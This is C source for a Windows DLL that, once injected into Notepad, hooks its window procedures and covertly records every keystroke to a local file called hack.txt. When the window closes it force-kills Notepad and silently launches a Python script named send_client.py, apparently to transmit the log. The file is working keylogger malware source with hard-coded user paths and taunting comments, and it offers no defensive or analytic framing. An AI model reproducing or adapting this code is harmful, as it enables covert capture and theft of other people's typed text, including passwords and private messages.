#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <string.h>



LONG_PTR previous_func_child = NULL;
LONG_PTR previous_func_parent = NULL;
//char dest[] = "Hello this is ethan i hack you! LOL";


char* read_line(char *str, int n, FILE *stream)
{
	char *ans = fgets(str, n, stream);
	if (ans == NULL)
		return NULL;
	int newlineIndex = strcspn(str, "\n");
	str[newlineIndex] = 0;
	return str;
}

void file2buffer(char *dest) {
	FILE *fp = fopen("C:\\Users\\Ethan\\Desktop\\C\\TroySous_ETHAN\\hack.txt", "r");
	read_line(dest, 40, fp);
}


void char2file(char c) {
	FILE *fp = fopen("C:\\Users\\Ethan\\Desktop\\C\\TroySous_ETHAN\\hack.txt", "a+");
	//FILE *fp = fopen("C:\\Users\\Elie Barkate\\Documents\\hack.txt", "a+");
	const char* write_format = "%c";
	
	fprintf(fp, write_format, c);
	fclose(fp);

}

void end_writting() {
	//FILE *fp = fopen("C:\\Users\\Elie Barkate\\Documents\\hack.txt", "a+");
	FILE *fp = fopen("C:\\Users\\Ethan\\Desktop\\C\\TroySous_ETHAN\\hack.txt", "a+");

	const char* write_format = "%s";
	fprintf(fp, write_format, "\n--------------------\n");
	fclose(fp);
}
LRESULT CALLBACK WindowProcParent(
	_In_ HWND   hwnd,
	_In_ UINT   uMsg,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
) {
	switch (uMsg)
	{
	case WM_CLOSE:
		CallWindowProcA(previous_func_parent, hwnd, uMsg, wParam, lParam);
		WinExec("taskkill /IM \"notepad.exe\" /F", SW_HIDE);
		end_writting();
		system("start pythonw C:\\Users\\Ethan\\Desktop\\C\\TroySous_ETHAN\\send_client.py");
		//system("C:\\Users\\Elie Barkate\\Documents\\send_client.py");

	default:
		return CallWindowProcA(previous_func_parent, hwnd, uMsg, wParam, lParam);
	}
	return 0;
}



void delete_last_char() {
#pragma region Copy file with delete
	FILE *fp = fopen("C:\\Users\\Ethan\\Desktop\\C\\TroySous_ETHAN\\hack.txt", "r");
	//FILE *fp = fopen("C:\\Users\\Elie Barkate\\Documents\\hack.txt", "r");
	char copied[10000];
	int i = 0;
	char c = fgetc(fp);
	while (c != EOF)
	{
		copied[i] = c;
		i++;
		c = fgetc(fp);
	}
	copied[i] = '\0';
	int length = strlen(copied);
	copied[length - 1] = '\0';
	fclose(fp);
#pragma endregion
	FILE *fp2 = fopen("C:\\Users\\Ethan\\Desktop\\C\\TroySous_ETHAN\\hack.txt", "w");
	//FILE *fp = fopen("C:\\Users\\Elie Barkate\\Documents\\hack.txt", "w");
	fputs(copied,fp2);
	fclose(fp2);

}

LRESULT CALLBACK WindowProcChild(
	_In_ HWND   hwnd,
	_In_ UINT   uMsg,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
)
{
#pragma region change to "ihavk you"
	//MessageBoxW(NULL, L"3", L"myDLL", MB_OKCANCEL);
	/*
				char c;
	if (uMsg == WM_CHAR)
	{
		if (i != 37) {
			c = dest[i];
			wParam = c;
			i++;
		}
		else
			wParam = NULL;
	}*/

	//MessageBoxW(NULL, L"4", L"myDLL", MB_OKCANCEL);
#pragma endregion
	
	if (uMsg == WM_CHAR)
	{
		if (wParam == 13) {
			wParam = '\n';
			char2file(wParam);
			wParam = 13;
		}
		else if (wParam == 8) {
			delete_last_char();
		}
		else
			char2file(wParam);
	}
	
	return CallWindowProcA(previous_func_child , hwnd, uMsg, wParam, lParam);
}

void fuckwindow() {
	HWND hparent = FindWindowExA(NULL,NULL, "Notepad", NULL );
	previous_func_parent = GetWindowLongPtrA(hparent, GWLP_WNDPROC);
	SetWindowLongPtrA(hparent, GWLP_WNDPROC, (LONG_PTR)WindowProcParent);

	HWND hedit = FindWindowExA(hparent,NULL,"Edit",NULL);
	previous_func_child = GetWindowLongPtrA(hedit, GWLP_WNDPROC);
	SetWindowLongPtrA(hedit, GWLP_WNDPROC,(LONG_PTR)WindowProcChild);
}


BOOL APIENTRY DllMain(
	_In_ HINSTANCE hinstDLL,
	_In_ DWORD     fdwReason,
	_In_ LPVOID    lpvReserved
) {
	if (fdwReason==DLL_PROCESS_ATTACH)
	{
		//MessageBoxW(NULL, L"HELLO", L"myDLL", MB_OK);

		fuckwindow();
	}
	
	

	return TRUE;
	
}
